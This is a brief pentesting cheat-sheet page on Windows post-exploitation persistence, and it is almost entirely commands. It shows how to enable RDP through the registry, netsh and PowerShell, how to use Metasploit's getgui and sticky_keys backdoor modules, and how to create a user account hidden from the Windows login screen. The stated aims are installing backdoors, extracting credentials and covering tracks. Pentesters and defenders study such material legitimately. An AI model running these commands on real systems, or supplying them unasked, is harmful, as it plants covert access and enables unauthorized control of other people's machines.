---
title: 6. Post-exploitation - Windows
categories:
  - Pentesting
  - Windows
tags:
  - Pentesting
  - Windows
  - Post-exploitation
toc: true
---

---
Step 6: Post exploitation.
Install backdoors, extract credentials and relevant data, clean step foots. 

---
<!-- more -->

<br>


## Persistence

### RDP
```batch Allow RDP through Registry (as administrator)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
```batch Allow RDP through the Windows Firewall (as administrator)
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
```pwsh Allow RDP through Powershell (as administrator)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
```
<br>
```bash Metasploit - show GUI
run getgui -e -u 'user' -p 'password'
```
<br>
```bash Metasploit - sticky keys
use post/windows/manage/sticky_keys
set session 1
exploit
```

<br>

```batch Create a hidden user
net user hiddenuser "password" /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hiddenuser /t REG_DWORD /d 0 /f
```

<br>

---
---